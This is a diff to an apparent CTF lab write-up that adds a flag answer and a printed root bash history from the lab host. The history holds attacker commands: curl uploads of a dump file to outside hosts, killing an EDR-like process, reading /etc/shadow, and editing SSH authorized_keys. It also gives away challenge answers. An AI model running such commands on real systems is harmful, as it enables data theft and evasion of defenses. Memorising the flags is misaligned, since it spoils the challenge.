@@ -297,7 +297,40 @@ THM{learning-linux-cli}
 ==sudo su==
 
 ##### Finally, what flag did Sir Carrotbane leave in the root bash history?
-==Answer==
+==THM{until-we-meet-again}==
+
+```
+root@tbfc-web01:~$ cat .bash_history
+whoami
+cd ~
+ll 
+nano .ssh/authorized_keys 
+curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
+curl --data "%qur\(tq_` :D AH?65P" http://red.hopsec.thm/report
+curl --data "THM{until-we-meet-again}" http://flag.hopsec.thm
+pkill tbfcedr
+cat /etc/shadow
+cat /etc/hosts
+exit
+cat /etc/shadow
+whomai
+whoami
+grep -i "THM" /home/.bash_history
+ls -a
+grep -i "THM" .bash_history
+cat .bash_history
+cd /home/socmas/
+cat .bash_history
+cd ..
+ls
+cd socmas
+ls
+ls 2025/
+cd /root/
+ls
+ls -a
+root@tbfc-web01:~$
+```
 
 ##### For those who consider themselves intermediate and want another challenge, check McSkidy's hidden note in `/home/mcskidy/Documents/` to get access to the key for **Side Quest 1**! Accessible through our [Side Quest Hub](https://tryhackme.com/adventofcyber25/sidequest)!
 ==Answer==
